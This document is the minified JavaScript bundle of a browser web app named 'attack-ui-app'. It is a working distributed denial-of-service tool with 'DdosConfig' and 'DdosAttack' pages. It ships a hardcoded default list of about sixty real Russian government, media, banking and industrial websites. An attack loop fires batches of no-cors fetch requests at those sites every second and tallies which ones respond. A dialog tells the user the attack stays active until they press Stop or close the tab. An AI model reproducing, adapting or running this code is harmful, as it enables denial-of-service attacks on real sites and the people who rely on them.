(()=>{"use strict";var t={7590:(t,e,r)=>{r(8156),r(6509);var s=r(4779),o=r(7233),a=r(536);function n(t,e){const r=(0,a.up)("router-view");return(0,a.wg)(),(0,a.j4)(r)}var i=r(9895);const u={},l=(0,i.Z)(u,[["render",n]]),c=l;var p=r(6205),h=r(6780),d=r(8597);const w=[{name:"MainLayout",path:"/",component:()=>Promise.all([r.e(736),r.e(370)]).then(r.bind(r,7370)),children:[{name:"Index",path:"/",component:()=>r.e(780).then(r.bind(r,8780)),redirect:{name:"DdosConfig"}},{name:"AttackLayout",path:"/attack",component:()=>Promise.all([r.e(736),r.e(505)]).then(r.bind(r,3505)),redirect:{name:"Index"},children:[{name:"DdosConfig",path:"ddos/config",component:()=>Promise.all([r.e(736),r.e(540)]).then(r.bind(r,1540))},{name:"DdosAttack",path:"ddos/start",component:()=>Promise.all([r.e(736),r.e(371)]).then(r.bind(r,2371))}]}]},{path:"/:catchAll(.*)*",component:()=>Promise.all([r.e(736),r.e(837)]).then(r.bind(r,2143))}],g=w,f=(0,h.BC)((function(){const t=d.PO,e=(0,d.p7)({scrollBehavior:()=>({left:0,top:0}),routes:g,history:t("/")});return e}));async function m(t,e){const s="function"===typeof p["default"]?await(0,p["default"])({}):p["default"],{storeKey:a}=await Promise.resolve().then(r.bind(r,6205)),n="function"===typeof f?await f({store:s}):f;s.$router=n;const i=t(c);return i.use(o.Z,e),{app:i,store:s,storeKey:a,router:n}}var v=r(1712),k=r(652);const b={config:{},plugins:{Notify:v.Z,Dialog:k.Z}},y="/";async function A({app:t,router:e,store:r,storeKey:s},o){let a=!1;const n=t=>{try{return e.resolve(t).href}catch(r){}return Object(t)===t?null:t},i=t=>{if(a=!0,"string"===typeof t&&/^https?:\/\//.test(t))return void(window.location.href=t);const e=n(t);null!==e&&(window.location.href=e)},u=window.location.href.replace(window.location.origin,"");for(let c=0;!1===a&&c<o.length;c++)try{await o[c]({app:t,router:e,store:r,ssrContext:null,redirect:i,urlPath:u,publicPath:y})}catch(l){return l&&l.url?void i(l.url):void console.error("[Quasar] boot error:",l)}!0!==a&&(t.use(e),t.use(r,s),t.mount("#q-app"))}m(s.ri,b).then((t=>Promise.all([Promise.resolve().then(r.bind(r,641))]).then((e=>{const r=e.map((t=>t.default)).filter((t=>"function"===typeof t));A(t,r)}))))},641:(t,e,r)=>{r.r(e),r.d(e,{default:()=>o});var s=r(6780);const o=(0,s.xr)((({app:t})=>{}))},6205:(t,e,r)=>{r.r(e),r.d(e,{default:()=>R});var s={};r.r(s),r.d(s,{getBrowserAttackIntervalId:()=>g,getBrowserAttackResults:()=>w,getBrowserAttackStatus:()=>d,getDdosConfig:()=>p,getResultsBrowserAttack:()=>h,getTargetsList:()=>c});var o={};r.r(o),r.d(o,{removeAllTargets:()=>B,removeTarget:()=>T,resetDdosConfig:()=>S,setBrowserAttackIntervalId:()=>x,setBrowserAttackStatus:()=>E,setDdosConfig:()=>P,setInitTargets:()=>L,setResultsBrowserAttack:()=>j,setTarget:()=>O});var a={};r.r(a),r.d(a,{destroyBrowserAttack:()=>F,initBrowserAttack:()=>M,setDefaultTargets:()=>q});var n=r(6780),i=r(3721),u=r(4883);function l(){return{targetsList:[],config:{user:{},default:{reqCount:100,streamsCount:1}},resultsBrowserAttack:{},browserAttackStatus:!1,browserAttackIntervalId:null}}r(6509);const c=t=>t.targetsList,p=t=>t.config,h=t=>t.resultsBrowserAttack,d=t=>t.browserAttackStatus,w=t=>Object.entries(t.resultsBrowserAttack).map((([t,e])=>({target:t,...e}))),g=t=>t.browserAttackIntervalId;var f=r(1712);const m={timeout:1500,progress:!0,actions:[{icon:"close",color:"white"}]},v=t=>(f.Z.create({type:"negative",message:t,...m}),!0),k=t=>{f.Z.create({message:t,...m})};r(7918);var b=r(7790),y=r.n(b),A=r(3245),C=r.n(A);const I=t=>{if(t)if(y()(t)||C()(t)){if(!(targetsList.indexOf(t.trim())>-1))return!0;v("Target already added")}else v("It doesn`t look like a url or ip address")},B=t=>{t.targetsList=[]},T=(t,e)=>{t.targetsList.splice(e,1)},O=(t,{target:e,callback:r})=>{t.targetsList.indexOf(e)>0||I(e)&&(t.targetsList.unshift(e),k("Target added"),r&&r())},L=(t,e)=>{B(t),t.targetsList.push(...e)},P=(t,e)=>{for(const r in e)e[r]=Number(e[r]);t.config.user=e},S=t=>{t.config.user=t.config.default},j=(t,e)=>{const r=t.resultsBrowserAttack;for(const s in e)r[s]||(r[s]={success:0,error:0}),r[s][e[s]?"success":"error"]++},E=(t,e)=>{t.browserAttackStatus=e},x=(t,e)=>{t.browserAttackIntervalId=e},D=async()=>["https://lenta.ru/","https://ria.ru/","https://ria.ru/lenta/","https://www.rbc.ru/","https://www.rt.com/","http://kremlin.ru/","http://en.kremlin.ru/","https://smotrim.ru/","https://tass.ru/","https://tvzvezda.ru/","https://vsoloviev.ru/","https://www.1tv.ru/","https://www.vesti.ru/","https://online.sberbank.ru/","https://sberbank.ru/","https://zakupki.gov.ru/","https://www.gosuslugi.ru/","https://er.ru/","https://www.rzd.ru/","https://rzdlog.ru/","https://vgtrk.ru/","https://www.interfax.ru/","https://www.mos.ru/uslugi/","http://government.ru/","https://mil.ru/","https://www.nalog.gov.ru/","https://customs.gov.ru/","https://pfr.gov.ru/","https://rkn.gov.ru/","https://www.gazprombank.ru/","https://www.vtb.ru/","https://www.gazprom.ru/","https://lukoil.ru","https://magnit.ru/","https://www.nornickel.com/","https://www.surgutneftegas.ru/","https://www.tatneft.ru/","https://www.evraz.com/ru/","https://nlmk.com/","https://www.sibur.ru/","https://www.severstal.com/","https://www.metalloinvest.com/","https://nangs.org/","https://rmk-group.ru/ru/","https://www.tmk-group.ru/","https://ya.ru/","https://www.polymetalinternational.com/ru/","https://www.uralkali.com/ru/","https://www.eurosib.ru/","https://ugmk.ua/","https://omk.ru/","https://sputniknews.com/","https://lt.sputniknews.ru/","https://baltnews.lt/","https://sputniknews.ru/","https://regnum.ru/\t","https://iz.ru/","https://eadaily.com/","https://www.rubaltic.ru/","https://lt.rubaltic.ru/"];r(1832);var _=r(652);const z=async({title:t,message:e,okLabel:r,cancelLabel:s})=>await new Promise((o=>{_.Z.create({title:t,message:e,cancel:!!s,ok:{label:r,noCaps:!0,color:"dark"},cancel:{label:s,noCaps:!0,flat:!0,color:"red"}}).onOk((()=>{o(!0)})).onOk((()=>{o(!0)})).onCancel((()=>{o(!1)})).onDismiss((()=>{o(!1)}))})),N=async t=>await new Promise(((e,r)=>{const s={};for(let a=0;a<t.length;a++)try{const r=t[a],o=new AbortController,n=setTimeout((()=>o.abort()),1e4);fetch(r,{method:"GET",mode:"no-cors",signal:o.signal}).then((()=>{s[r]=!0})).catch((()=>{s[r]=!1})).finally((()=>{clearTimeout(n),Object.keys(s).length===t.length&&e(s)}))}catch(o){console.error(o)}})),Z=()=>{z({title:"Attack started",message:'Until you press the "Stop" button or close the tab, the attack will be active. Startup may take up to 1 minute',okLabel:"Okey"})},q=async t=>{try{if(t.getters.getTargetsList.length>0)return;const e=await D();t.commit("setInitTargets",e)}catch(e){v("Error requesting default targets"),console.error(e)}},M=t=>{const e=t.getters.getDdosConfig.user,r=t.getters.getTargetsList,s=t.getters.getBrowserAttackIntervalId;t.commit("setBrowserAttackStatus",!0);let o=0;const a=setInterval((async()=>{const s=o>=r.length?0:o+1,a=s+e.reqCount;o=a;const n=await N(r.slice(s,a));t.commit("setResultsBrowserAttack",n)}),1e3);t.commit("setBrowserAttackIntervalId",a),s||setTimeout((()=>{Z()}),1e3)},F=t=>{const e=t.getters.getBrowserAttackIntervalId;clearInterval(e),t.commit("setBrowserAttackIntervalId",null),t.commit("setBrowserAttackStatus",!1)},K={namespaced:!0,state:l,getters:s,mutations:o,actions:a},R=(0,n.h)((function(){const t=new u.ZP({storage:window.localStorage}),e=(0,i.MT)({modules:{ddos:K},plugins:[t.plugin],strict:!1});return e}))}},e={};function r(s){var o=e[s];if(void 0!==o)return o.exports;var a=e[s]={exports:{}};return t[s](a,a.exports,r),a.exports}r.m=t,(()=>{var t=[];r.O=(e,s,o,a)=>{if(!s){var n=1/0;for(c=0;c<t.length;c++){for(var[s,o,a]=t[c],i=!0,u=0;u<s.length;u++)(!1&a||n>=a)&&Object.keys(r.O).every((t=>r.O[t](s[u])))?s.splice(u--,1):(i=!1,a<n&&(n=a));if(i){t.splice(c--,1);var l=o();void 0!==l&&(e=l)}}return e}a=a||0;for(var c=t.length;c>0&&t[c-1][2]>a;c--)t[c]=t[c-1];t[c]=[s,o,a]}})(),(()=>{r.n=t=>{var e=t&&t.__esModule?()=>t["default"]:()=>t;return r.d(e,{a:e}),e}})(),(()=>{r.d=(t,e)=>{for(var s in e)r.o(e,s)&&!r.o(t,s)&&Object.defineProperty(t,s,{enumerable:!0,get:e[s]})}})(),(()=>{r.f={},r.e=t=>Promise.all(Object.keys(r.f).reduce(((e,s)=>(r.f[s](t,e),e)),[]))})(),(()=>{r.u=t=>"js/"+t+"."+{370:"529c5fcb",371:"e9794ff5",505:"aff3d4fa",540:"b0337870",780:"1bd99a06",837:"a633b8f7"}[t]+".js"})(),(()=>{r.miniCssF=t=>"css/"+({143:"app",736:"vendor"}[t]||t)+"."+{143:"7abdbc7f",505:"043d59a9",540:"b680c0fc",736:"f35281a0"}[t]+".css"})(),(()=>{r.g=function(){if("object"===typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(t){if("object"===typeof window)return window}}()})(),(()=>{r.o=(t,e)=>Object.prototype.hasOwnProperty.call(t,e)})(),(()=>{var t={},e="attack-ui-app:";r.l=(s,o,a,n)=>{if(t[s])t[s].push(o);else{var i,u;if(void 0!==a)for(var l=document.getElementsByTagName("script"),c=0;c<l.length;c++){var p=l[c];if(p.getAttribute("src")==s||p.getAttribute("data-webpack")==e+a){i=p;break}}i||(u=!0,i=document.createElement("script"),i.charset="utf-8",i.timeout=120,r.nc&&i.setAttribute("nonce",r.nc),i.setAttribute("data-webpack",e+a),i.src=s),t[s]=[o];var h=(e,r)=>{i.onerror=i.onload=null,clearTimeout(d);var o=t[s];if(delete t[s],i.parentNode&&i.parentNode.removeChild(i),o&&o.forEach((t=>t(r))),e)return e(r)},d=setTimeout(h.bind(null,void 0,{type:"timeout",target:i}),12e4);i.onerror=h.bind(null,i.onerror),i.onload=h.bind(null,i.onload),u&&document.head.appendChild(i)}}})(),(()=>{r.r=t=>{"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})}})(),(()=>{r.p="/"})(),(()=>{var t=(t,e,r,s)=>{var o=document.createElement("link");o.rel="stylesheet",o.type="text/css";var a=a=>{if(o.onerror=o.onload=null,"load"===a.type)r();else{var n=a&&("load"===a.type?"missing":a.type),i=a&&a.target&&a.target.href||e,u=new Error("Loading CSS chunk "+t+" failed.\n("+i+")");u.code="CSS_CHUNK_LOAD_FAILED",u.type=n,u.request=i,o.parentNode.removeChild(o),s(u)}};return o.onerror=o.onload=a,o.href=e,document.head.appendChild(o),o},e=(t,e)=>{for(var r=document.getElementsByTagName("link"),s=0;s<r.length;s++){var o=r[s],a=o.getAttribute("data-href")||o.getAttribute("href");if("stylesheet"===o.rel&&(a===t||a===e))return o}var n=document.getElementsByTagName("style");for(s=0;s<n.length;s++){o=n[s],a=o.getAttribute("data-href");if(a===t||a===e)return o}},s=s=>new Promise(((o,a)=>{var n=r.miniCssF(s),i=r.p+n;if(e(n,i))return o();t(s,i,o,a)})),o={143:0};r.f.miniCss=(t,e)=>{var r={505:1,540:1};o[t]?e.push(o[t]):0!==o[t]&&r[t]&&e.push(o[t]=s(t).then((()=>{o[t]=0}),(e=>{throw delete o[t],e})))}})(),(()=>{var t={143:0};r.f.j=(e,s)=>{var o=r.o(t,e)?t[e]:void 0;if(0!==o)if(o)s.push(o[2]);else{var a=new Promise(((r,s)=>o=t[e]=[r,s]));s.push(o[2]=a);var n=r.p+r.u(e),i=new Error,u=s=>{if(r.o(t,e)&&(o=t[e],0!==o&&(t[e]=void 0),o)){var a=s&&("load"===s.type?"missing":s.type),n=s&&s.target&&s.target.src;i.message="Loading chunk "+e+" failed.\n("+a+": "+n+")",i.name="ChunkLoadError",i.type=a,i.request=n,o[1](i)}};r.l(n,u,"chunk-"+e,e)}},r.O.j=e=>0===t[e];var e=(e,s)=>{var o,a,[n,i,u]=s,l=0;if(n.some((e=>0!==t[e]))){for(o in i)r.o(i,o)&&(r.m[o]=i[o]);if(u)var c=u(r)}for(e&&e(s);l<n.length;l++)a=n[l],r.o(t,a)&&t[a]&&t[a][0](),t[a]=0;return r.O(c)},s=self["webpackChunkattack_ui_app"]=self["webpackChunkattack_ui_app"]||[];s.forEach(e.bind(null,0)),s.push=e.bind(null,s.push.bind(s))})();var s=r.O(void 0,[736],(()=>r(7590)));s=r.O(s)})();